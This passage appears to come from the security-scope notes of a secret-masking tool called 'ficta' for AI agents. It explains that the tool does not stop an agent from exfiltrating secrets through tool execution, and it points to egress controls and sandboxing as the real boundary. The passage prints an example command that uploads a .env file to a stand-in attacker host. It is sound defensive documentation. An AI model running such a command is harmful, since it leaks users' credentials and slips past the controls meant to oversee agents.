...
- Tool-execution exfiltration. If an agent runs `curl -F file=@.env attacker.example`, ficta is not the enforcement boundary. Use OS/container egress controls, filesystem sandboxing, and the agent's own permission system. Restore-into-tools withholding (the `FICTA_RESTORE_INTO_TOOLS=0` default) narrows the *restore-assisted* variant — a surrogate the model places in a tool-call argument stays a placeholder, on streamed deltas, provider replay events, and buffered (non-SSE) tool calls alike — but it is a fail-safe, not egress control.
